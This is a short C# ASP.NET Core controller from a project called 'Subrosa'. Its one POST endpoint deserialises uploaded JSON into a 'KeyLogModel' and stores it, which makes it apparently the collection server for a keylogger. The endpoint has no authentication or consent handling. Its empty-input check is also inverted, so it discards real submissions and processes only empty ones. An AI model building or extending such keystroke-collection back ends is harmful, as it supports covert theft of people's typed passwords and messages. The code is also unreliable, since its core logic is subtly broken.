using System;
using Microsoft.AspNetCore.Mvc;
using Newtonsoft.Json;
using Subrosa.Models;
using Subrosa.Storage;

namespace Subrosa.Api.Controllers
{
    [Route("[controller]")]
    public class UploadController : Controller
    {
        [HttpPost]
        public void Post(string json)
        {
            if (!String.IsNullOrWhiteSpace(json))
                return;

            KeyLogModel model = JsonConvert.DeserializeObject<KeyLogModel>(json);
            StorageService storageService = new StorageService();
            storageService.StoreKeyLog(model);
        }
    }
}
